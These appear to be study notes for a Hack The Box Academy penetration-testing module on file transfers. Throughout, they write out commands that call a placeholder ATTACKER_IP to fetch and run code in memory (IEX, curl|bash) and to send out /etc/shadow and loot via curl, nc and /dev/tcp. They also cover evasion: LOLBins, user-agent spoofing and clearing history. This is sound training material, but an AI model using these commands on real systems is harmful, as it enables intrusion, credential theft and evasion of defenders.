# HTB Academy — Module 07: File Transfers

| Field | Details |
|---|---|
| **Platform** | Hack The Box Academy |
| **Module** | 07 — File Transfers |
| **Difficulty** | Medium |
| **Type** | Offensive — Red Team, OPSEC, Evasion |
| **Date** | April 2026 |

---

## Module Overview

During a penetration test, transferring tools, payloads, and exfiltrated data between attacker and target is a constant requirement. Security controls — AV, EDR, AppLocker, web filtering, and network monitoring — block the obvious approaches. This module covers the full spectrum of file transfer techniques for Windows and Linux, from basic HTTP and SMB through encrypted channels, base64 encoding, LOLBins, and detection evasion.

**Core areas:**

| Area | Description |
|---|---|
| Windows downloads | PowerShell, certutil, BITS, WebClient, FTP, SMB |
| Windows uploads | WinRM, certreq, uploadserver |
| Linux downloads | curl, wget, /dev/tcp, SCP, Python, PHP, base64 |
| Linux uploads | curl POST, nc, SCP, Python requests |
| Encrypted transfers | AES (Windows), OpenSSL (Linux/cross-platform) |
| Fileless execution | IEX, pipe to bash — nothing written to disk |
| LOLBins | certutil, bitsadmin, GfxDownloadWrapper, desktopimgdownldr |
| Servers | Python HTTP, Nginx PUT, uploadserver, SMB, FTP |
| RDP transfers | Drive mounting via xfreerdp, tsclient share |
| Detection evasion | UA spoofing, HTTPS, port 443, obscure binaries |

---

## Section 1 — Core Principles

### The 6 Rules of File Transfer

| Rule | Why It Matters |
|---|---|
| Start simple — HTTP/SMB if available | Fastest path; use complex methods only when blocked |
| Encrypt sensitive data before transit | PII, credentials, and loot must not travel in plaintext |
| Use native binaries when tools are blocked | AV and AppLocker block dropped tools; LOLBins are pre-approved |
| Verify every transfer with a hash | Corrupted transfers cause silent failures in exploits |
| Clean up artifacts after transfer | BITS jobs, certutil cache, and temp files persist and get flagged |
| Blend with environment baseline | Port 443, business hours, cloud IPs, browser-like User-Agent |

> **Important:** Do not exfiltrate real PII, financial data, or trade secrets during an engagement unless explicitly in scope. For DLP testing, create dummy data that mimics the client's sensitive data format.

---

## Section 2 — Setting Up Transfer Servers on Kali

Before transferring anything to a target, the attacker needs a server to serve files from. These are the standard options depending on the situation.

### Python HTTP Server (Simplest)

```bash
# Python 3
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8000

# Python 3 — specific directory
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8000 --directory /opt/privesc

# Python 2
Hackerpatel007_1@htb[/htb]$ python2.7 -m SimpleHTTPServer 8000
```

### uploadserver — Accepts File Uploads

```bash
Hackerpatel007_1@htb[/htb]$ pip3 install uploadserver --break-system-packages
Hackerpatel007_1@htb[/htb]$ python3 -m uploadserver 9001
# Upload endpoint: http://ATTACKER_IP:9001/upload
```

### Impacket SMB Server (Windows Targets)

```bash
Hackerpatel007_1@htb[/htb]$ impacket-smbserver share /opt/tools -smb2support
Hackerpatel007_1@htb[/htb]$ impacket-smbserver share /opt/tools -smb2support -username user -password pass
```

### Python FTP Server

```bash
Hackerpatel007_1@htb[/htb]$ pip3 install pyftpdlib --break-system-packages
Hackerpatel007_1@htb[/htb]$ sudo python3 -m pyftpdlib --port 21
```

### Nginx PUT Upload Server

```bash
Hackerpatel007_1@htb[/htb]$ sudo mkdir -p /var/www/uploads/uploads
Hackerpatel007_1@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/uploads
```

`/etc/nginx/sites-available/upload.conf`:
```nginx
server {
    listen 9001;
    location /uploads/ {
        root /var/www/uploads;
        dav_methods PUT;
    }
}
```

```bash
Hackerpatel007_1@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
Hackerpatel007_1@htb[/htb]$ sudo systemctl restart nginx
```

---

## Section 3 — Windows Download Methods

### PowerShell WebClient

```powershell
# DownloadFile — saves to disk
PS C:\htb> (New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP:8000/nc.exe','C:\Windows\Temp\nc.exe')

# DownloadFileAsync — non-blocking
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('http://ATTACKER_IP:8000/nc.exe','C:\Windows\Temp\nc.exe')

# Fileless — executes in memory, nothing written to disk
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/PowerUp.ps1')
PS C:\htb> (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/Invoke-Mimikatz.ps1') | IEX
```

### Invoke-WebRequest (PowerShell 3.0+)

```powershell
PS C:\htb> Invoke-WebRequest http://ATTACKER_IP:8000/nc.exe -OutFile C:\Windows\Temp\nc.exe

# IE first-run error bypass
PS C:\htb> Invoke-WebRequest http://ATTACKER_IP:8000/nc.exe -UseBasicParsing -OutFile C:\Windows\Temp\nc.exe

# Skip SSL certificate validation
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
PS C:\htb> Invoke-WebRequest https://ATTACKER_IP:443/nc.exe -OutFile C:\Windows\Temp\nc.exe
```

### User-Agent Spoofing (Bypass Web Filtering)

```powershell
# Built-in preset
PS C:\htb> $ua = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://ATTACKER_IP:8000/nc.exe -UserAgent $ua -OutFile C:\Windows\Temp\nc.exe

# Custom realistic Chrome 124 UA
PS C:\htb> $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
PS C:\htb> Invoke-WebRequest http://ATTACKER_IP:8000/nc.exe -UserAgent $ua -OutFile C:\Windows\Temp\nc.exe
```

### certutil (LOLBin)

```cmd
C:\htb> certutil.exe -urlcache -split -f http://ATTACKER_IP:8000/nc.exe C:\Windows\Temp\nc.exe
C:\htb> certutil.exe -verifyctl -split -f http://ATTACKER_IP:8000/nc.exe C:\Windows\Temp\nc.exe
```

> Default UA: `Microsoft-CryptoAPI/10.0` — flagged by modern EDR. **Note:** AMSI currently detects certutil HTTP downloads as malicious. Use alternative methods on hardened targets.

### BITS — Background Intelligent Transfer Service

```cmd
C:\htb> bitsadmin /transfer job /priority foreground http://ATTACKER_IP:8000/nc.exe C:\Windows\Temp\nc.exe
```

```powershell
# PowerShell BitsTransfer
PS C:\htb> Import-Module BitsTransfer
PS C:\htb> Start-BitsTransfer -Source http://ATTACKER_IP:8000/nc.exe -Destination C:\Windows\Temp\nc.exe
```

> Default UA: `Microsoft BITS/7.8` — blends with Windows Update traffic. BITS jobs persist across reboots — always clean up with `bitsadmin /complete job`.

### SMB Download

```cmd
# Net use — map share then copy
C:\htb> net use n: \\ATTACKER_IP\share /user:user pass
C:\htb> copy n:\nc.exe C:\Windows\Temp\nc.exe

# Direct UNC path
C:\htb> copy \\ATTACKER_IP\share\nc.exe C:\Windows\Temp\nc.exe
```

```powershell
# PowerShell drive mapping
PS C:\htb> New-PSDrive -Name "n" -PSProvider "FileSystem" -Root "\\ATTACKER_IP\share"
PS C:\htb> Copy-Item n:\nc.exe C:\Windows\Temp\nc.exe
```

### FTP Download

```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://ATTACKER_IP/nc.exe','C:\Windows\Temp\nc.exe')
```

```cmd
# FTP script (non-interactive)
C:\htb> echo open ATTACKER_IP> ftp.txt
C:\htb> echo USER anonymous>> ftp.txt
C:\htb> echo binary>> ftp.txt
C:\htb> echo GET nc.exe>> ftp.txt
C:\htb> echo bye>> ftp.txt
C:\htb> ftp -v -n -s:ftp.txt
```

### Base64 Encode/Decode (No Network Required)

```bash
# Encode on Kali
Hackerpatel007_1@htb[/htb]$ cat nc.exe | base64 -w 0; echo
```

```powershell
# Decode on Windows
PS C:\htb> [IO.File]::WriteAllBytes("C:\Windows\Temp\nc.exe", [Convert]::FromBase64String("<BASE64_STRING>"))

# Verify hash matches
PS C:\htb> Get-FileHash C:\Windows\Temp\nc.exe -Algorithm MD5 | Select Hash
```

> **CMD limit:** cmd.exe has an 8,191 character string limit. Base64 of large files exceeds this — use PowerShell or split the file.

### LOLBins Reference (Windows)

| Binary | Purpose | Notes |
|---|---|---|
| certutil.exe | HTTP download | AMSI flagged — avoid on hardened targets |
| bitsadmin.exe | BITS HTTP download | Blends with Windows Update |
| GfxDownloadWrapper.exe | HTTP download | Intel graphics utility — rarely monitored |
| desktopimgdownldr.exe | HTTP download | Lockscreen image downloader |
| cmdl32.exe | HTTP download | VPN config utility |
| esentutl.exe | File copy | ESE database utility |

```cmd
# Obscure LOLBin — Intel graphics
C:\htb> GfxDownloadWrapper.exe "http://ATTACKER_IP:8000/mimikatz.exe" "C:\Temp\mimikatz.exe"
```

> Full reference: [LOLBAS Project](https://lolbas-project.github.io/) — filter by `/download` and `/upload`

---

## Section 4 — Windows Upload Methods

### WinRM PowerShell Remoting (AD Environments)

```powershell
# Upload to remote machine
PS C:\htb> $session = New-PSSession -ComputerName DATABASE01
PS C:\htb> Copy-Item -Path C:\loot\passwords.txt -ToSession $session -Destination C:\Windows\Temp\

# Download from remote machine
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\loot.txt" -Destination C:\ -FromSession $session
```

### certreq Upload

```cmd
C:\htb> certreq.exe -Post -config http://ATTACKER_IP:8000/ C:\Windows\win.ini
```

> Catch with Netcat listener: `nc -lvnp 8000`

### PowerShell Upload to uploadserver

```powershell
PS C:\htb> Invoke-WebRequest -Uri http://ATTACKER_IP:9001/upload -Method POST -InFile C:\loot.txt
```

---

## Section 5 — Linux Download Methods

### curl and wget

```bash
# curl
Hackerpatel007_1@htb[/htb]$ curl http://ATTACKER_IP:8000/linpeas.sh -o /tmp/linpeas.sh
Hackerpatel007_1@htb[/htb]$ curl -k https://ATTACKER_IP:443/linpeas.sh -o /tmp/linpeas.sh    # Skip SSL

# wget
Hackerpatel007_1@htb[/htb]$ wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/linpeas.sh
Hackerpatel007_1@htb[/htb]$ wget -q http://ATTACKER_IP:8000/linpeas.sh -O /tmp/linpeas.sh     # Quiet

# Fileless — execute directly in memory
Hackerpatel007_1@htb[/htb]$ curl http://ATTACKER_IP:8000/linpeas.sh | bash
Hackerpatel007_1@htb[/htb]$ wget -qO- http://ATTACKER_IP:8000/LinEnum.sh | bash
```

### SCP (SSH Available)

```bash
# Download from target to Kali
Hackerpatel007_1@htb[/htb]$ scp user@target_IP:/etc/shadow /tmp/shadow

# Upload from Kali to target
Hackerpatel007_1@htb[/htb]$ scp /opt/linpeas.sh user@target_IP:/tmp/linpeas.sh
```

### /dev/tcp (No curl/wget Available)

```bash
# Pure Bash — no external tools required
Hackerpatel007_1@htb[/htb]$ exec 3<>/dev/tcp/ATTACKER_IP/8000
Hackerpatel007_1@htb[/htb]$ echo -e "GET /linpeas.sh HTTP/1.1\nHost: ATTACKER_IP\n\n">&3
Hackerpatel007_1@htb[/htb]$ cat <&3 > /tmp/linpeas.sh

# Inline one-liner
Hackerpatel007_1@htb[/htb]$ cat < /dev/tcp/ATTACKER_IP/443 > /tmp/nc
```

### Python

```bash
# Python 3
Hackerpatel007_1@htb[/htb]$ python3 -c 'import urllib.request; urllib.request.urlretrieve("http://ATTACKER_IP:8000/linpeas.sh","/tmp/linpeas.sh")'

# Python 2
Hackerpatel007_1@htb[/htb]$ python2.7 -c 'import urllib; urllib.urlretrieve("http://ATTACKER_IP:8000/linpeas.sh","/tmp/linpeas.sh")'
```

### PHP

```bash
Hackerpatel007_1@htb[/htb]$ php -r '$file = file_get_contents("http://ATTACKER_IP:8000/linpeas.sh"); file_put_contents("/tmp/linpeas.sh",$file);'
```

### OpenSSL (LOLBin — Encrypted Download)

```bash
# On Kali — start SSL listener serving a file
Hackerpatel007_1@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
Hackerpatel007_1@htb[/htb]$ openssl s_server -quiet -accept 443 -cert cert.pem -key key.pem < /opt/linpeas.sh

# On target — receive
Hackerpatel007_1@htb[/htb]$ openssl s_client -connect ATTACKER_IP:443 -quiet > /tmp/linpeas.sh
```

### Base64 Encode/Decode

```bash
# Encode on target
Hackerpatel007_1@htb[/htb]$ cat /etc/shadow | base64 -w 0; echo

# Decode on Kali
Hackerpatel007_1@htb[/htb]$ echo "<BASE64_STRING>" | base64 -d > shadow

# Verify hash
Hackerpatel007_1@htb[/htb]$ md5sum shadow
```

---

## Section 6 — Linux Upload Methods

### curl POST

```bash
# Single file
Hackerpatel007_1@htb[/htb]$ curl -F "file=@/etc/shadow" http://ATTACKER_IP:9001/upload

# HTTPS upload (self-signed cert)
Hackerpatel007_1@htb[/htb]$ curl -X POST https://ATTACKER_IP:443/upload -F "files=@/etc/shadow" --insecure
```

### Python requests (programmatic)

```bash
Hackerpatel007_1@htb[/htb]$ python3 -c 'import requests; requests.post("http://ATTACKER_IP:9001/upload", files={"files": open("/etc/shadow","rb")})'
```

### SCP Upload

```bash
Hackerpatel007_1@htb[/htb]$ scp /etc/shadow user@ATTACKER_IP:/tmp/shadow
```

### /dev/tcp Upload

```bash
Hackerpatel007_1@htb[/htb]$ cat /etc/shadow > /dev/tcp/ATTACKER_IP/443
```

> Catch on Kali: `nc -lvnp 443 > shadow`

### Netcat

```bash
# On Kali — receive
Hackerpatel007_1@htb[/htb]$ nc -lvnp 8000 > shadow

# On target — send
Hackerpatel007_1@htb[/htb]$ nc ATTACKER_IP 8000 < /etc/shadow
```

---

## Section 7 — Encrypted File Transfers

Transferring sensitive files (credentials, private keys, hashdumps) in plaintext over HTTP exposes them to network monitoring. Always encrypt loot before transfer.

### Windows — AES Encryption

```powershell
# Download the script
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ricmoo/Invoke-AESEncryption/master/Invoke-AESEncryption.ps1')

# Encrypt
PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "StrongUniquePassphrase!" -Path C:\loot.txt
# Creates: C:\loot.txt.aes

# Decrypt (on Kali after transfer)
PS C:\htb> Invoke-AESEncryption -Mode Decrypt -Key "StrongUniquePassphrase!" -Path C:\loot.txt.aes
```

### Linux — OpenSSL AES-256

```bash
# Encrypt single file
Hackerpatel007_1@htb[/htb]$ openssl enc -aes256 -pbkdf2 -iter 100000 -in /etc/shadow -out shadow.enc

# Encrypt entire directory
Hackerpatel007_1@htb[/htb]$ tar -czf - /opt/loot/ | openssl enc -aes256 -pbkdf2 -iter 100000 -out loot.enc

# Decrypt
Hackerpatel007_1@htb[/htb]$ openssl enc -d -aes256 -pbkdf2 -iter 100000 -in shadow.enc -out shadow
```

---

## Section 8 — RDP File Transfer

When RDP access is available, mount a local folder as a drive share — bypasses all network filtering since files transfer inside the encrypted RDP session.

### xfreerdp — Mount Local Directory

```bash
Hackerpatel007_1@htb[/htb]$ xfreerdp /v:TARGET_IP /u:htb-student /p:Password123! /drive:tools,/opt/tools /cert:ignore
```

Inside the RDP session, the mounted drive is accessible at `\\tsclient\tools\` in Windows Explorer or CMD.

```cmd
C:\htb> copy \\tsclient\tools\nc.exe C:\Windows\Temp\nc.exe
C:\htb> copy C:\loot.txt \\tsclient\tools\loot.txt
```

### mstsc.exe — Windows RDP Client

In the RDP connection dialog: **Local Resources → More → check Drives → connect**. The local drives appear under `\\tsclient\` inside the RDP session.

---

## Section 9 — Fileless Techniques

Fileless techniques execute code entirely in memory — nothing written to disk, no artifact for AV to scan.

### Windows — IEX (In-Memory Execution)

```powershell
# Execute PowerShell script directly in memory
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/PowerUp.ps1')

# Pipe from Invoke-WebRequest
PS C:\htb> Invoke-WebRequest http://ATTACKER_IP:8000/Invoke-Mimikatz.ps1 | IEX

# HTTPS in-memory
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://ATTACKER_IP:443/PowerUp.ps1')
```

### Linux — Pipe to Interpreter

```bash
# Execute directly — no temp file
Hackerpatel007_1@htb[/htb]$ curl http://ATTACKER_IP:8000/linpeas.sh | bash
Hackerpatel007_1@htb[/htb]$ wget -qO- http://ATTACKER_IP:8000/LinEnum.sh | bash

# Pipe Python script
Hackerpatel007_1@htb[/htb]$ curl http://ATTACKER_IP:8000/exploit.py | python3
```

---

## Section 10 — Detection Signals and Evasion

### Detection Signals by Method

| Method | User-Agent String | Endpoint Logs | Network |
|---|---|---|---|
| Invoke-WebRequest | WindowsPowerShell/5.1 | EID 4104 (PS logging) | HTTP GET |
| (New-Object Net.WebClient) | WindowsPowerShell/5.1 | EID 4104 | HTTP GET |
| certutil | Microsoft-CryptoAPI/10.0 | EID 4688 (process creation) | HTTP GET |
| bitsadmin | Microsoft BITS/7.8 | BITS job log | HEAD + GET |
| nc / /dev/tcp | None | Process creation + bash | Raw TCP |
| curl (Linux) | curl/7.x.x | Process creation | HTTP GET |
| GfxDownloadWrapper | Intel UA | Rarely monitored | HTTP GET |

### User-Agent Spoofing

```powershell
# Realistic Chrome 124 on Windows 10
PS C:\htb> $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
PS C:\htb> Invoke-WebRequest http://ATTACKER_IP:8000/nc.exe -UserAgent $ua -OutFile C:\Windows\Temp\nc.exe

# Firefox on Windows 10
PS C:\htb> $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"
```

### Evasion Summary

| Technique | Effect |
|---|---|
| Use port 443 (HTTPS) | Blends with web traffic — rarely blocked |
| Spoof User-Agent to Chrome/Firefox | Bypasses UA-based web filters |
| Use LOLBins (GfxDownloadWrapper, desktopimgdownldr) | Pre-approved binaries — not blocked by AppLocker |
| Fileless via IEX or pipe-to-bash | Nothing written to disk — bypasses on-access AV |
| Double-archive with password | Prevents signature scanning of payload |
| RDP drive mount | Transfer inside encrypted RDP session — invisible to network monitoring |
| Transfer at off-peak hours | Avoids anomaly detection thresholds |

---

## Section 11 — Verification and Cleanup

### Hash Verification — Every Transfer

```bash
# Linux
Hackerpatel007_1@htb[/htb]$ md5sum nc
Hackerpatel007_1@htb[/htb]$ sha256sum nc
```

```powershell
# Windows
PS C:\htb> Get-FileHash C:\Windows\Temp\nc.exe -Algorithm MD5 | Select Hash
PS C:\htb> Get-FileHash C:\Windows\Temp\nc.exe -Algorithm SHA256 | Select Hash

# Compare two files
PS C:\htb> (Get-FileHash nc.exe).Hash -eq (Get-FileHash C:\Windows\Temp\nc.exe).Hash
```

### Cleanup

```cmd
# Remove BITS jobs (persist across reboots if not cleaned)
C:\htb> bitsadmin /complete job

# Clear certutil URL cache
C:\htb> certutil -urlcache -f http://ATTACKER_IP/nc.exe delete
```

```powershell
# Remove temp files
PS C:\htb> Remove-Item C:\Windows\Temp\nc.exe -Force
PS C:\htb> Remove-Item $env:TEMP\* -Force -Recurse
```

```bash
# Linux cleanup
Hackerpatel007_1@htb[/htb]$ rm -f /tmp/linpeas.sh /tmp/nc shadow.enc
Hackerpatel007_1@htb[/htb]$ history -c      # Clear bash history
```

---

## Quick Decision Guide

```
SITUATION                            RECOMMENDED METHOD
─────────────────────────────────────────────────────────────────────
HTTP/HTTPS access, Windows           Invoke-WebRequest with UA spoof
AppLocker blocks PowerShell          certutil or bitsadmin (LOLBin)
certutil detected by EDR             GfxDownloadWrapper or desktopimgdownldr
No internet access                   SMB share (impacket-smbserver)
SSH available                        SCP (encrypted, trusted protocol)
No curl/wget/nc on Linux             /dev/tcp pure bash
Need encrypted transfer              OpenSSL AES-256 (Linux) or Invoke-AESEncryption (Windows)
RDP session available                Drive mount via xfreerdp or mstsc
Need fileless execution              IEX (Windows) or curl | bash (Linux)
Large file, need background          BITS transfer (Windows)
```

---

## Key Takeaways

The most important concept in this module is that the right transfer method is determined by what the environment blocks, not by personal preference. HTTP works until the proxy filters it. PowerShell works until AppLocker blocks it. certutil works until EDR flags it. Having the full chain — from obvious to obscure — means there is always a next option.

The detection signal table is more practically useful than the command list. Knowing that Invoke-WebRequest leaves `WindowsPowerShell/5.1` in web logs, while `GfxDownloadWrapper.exe` leaves an Intel graphics user-agent that no SOC analyst is looking for, makes the choice obvious when stealth matters. The tool that works is not always the tool that is quiet.

Fileless execution via IEX on Windows and `curl | bash` on Linux is the cleanest approach when AV scanning is active. Nothing touches disk means nothing gets scanned. For privilege escalation scripts like LinPEAS and PowerUp, piping directly into the interpreter is both faster and safer than downloading first.

Hash verification is a discipline that prevents a very specific failure mode: a transfer that completes but corrupts the payload. Buffer overflow exploits with a single wrong byte in the shellcode crash silently. A five-second hash comparison after every transfer catches this before it wastes thirty minutes of debugging the wrong problem.

---

## Commands Reference

| Command | Platform | Purpose |
|---|---|---|
| `python3 -m http.server 8000` | Kali | Serve files via HTTP |
| `python3 -m uploadserver 9001` | Kali | HTTP server that accepts uploads |
| `impacket-smbserver share /path -smb2support` | Kali | SMB file share |
| `(New-Object Net.WebClient).DownloadFile('URL','path')` | Windows | Download to disk |
| `IEX (New-Object Net.WebClient).DownloadString('URL')` | Windows | In-memory execution |
| `Invoke-WebRequest URL -OutFile path` | Windows | Download (PS 3.0+) |
| `Invoke-WebRequest URL -UseBasicParsing -OutFile path` | Windows | Bypass IE first-run error |
| `certutil.exe -urlcache -split -f URL file` | Windows | LOLBin HTTP download |
| `bitsadmin /transfer job /priority foreground URL path` | Windows | BITS background download |
| `GfxDownloadWrapper.exe "URL" "path"` | Windows | Obscure LOLBin download |
| `net use n: \\IP\share /user:user pass` | Windows | Map SMB share |
| `curl URL -o /path` | Linux | Download file |
| `wget URL -O /path` | Linux | Download file |
| `curl URL \| bash` | Linux | Fileless execution |
| `scp user@IP:/path /local` | Linux | SCP download |
| `scp /local user@IP:/path` | Linux | SCP upload |
| `cat < /dev/tcp/IP/PORT > /tmp/file` | Linux | Pure bash download |
| `openssl s_client -connect IP:443 -quiet > file` | Linux | Encrypted download |
| `openssl enc -aes256 -pbkdf2 -iter 100000 -in file -out file.enc` | Linux | Encrypt file |
| `openssl enc -d -aes256 -pbkdf2 -iter 100000 -in file.enc -out file` | Linux | Decrypt file |
| `curl -F "file=@/path" http://IP:9001/upload` | Linux | Upload via HTTP POST |
| `xfreerdp /v:IP /u:user /p:pass /drive:share,/local/path /cert:ignore` | Kali | Mount local dir over RDP |
| `md5sum file` | Linux | Verify hash |
| `Get-FileHash file -Algorithm MD5 \| Select Hash` | Windows | Verify hash |
| `certutil -urlcache -f URL delete` | Windows | Clear certutil cache |
| `bitsadmin /complete job` | Windows | Remove BITS job |
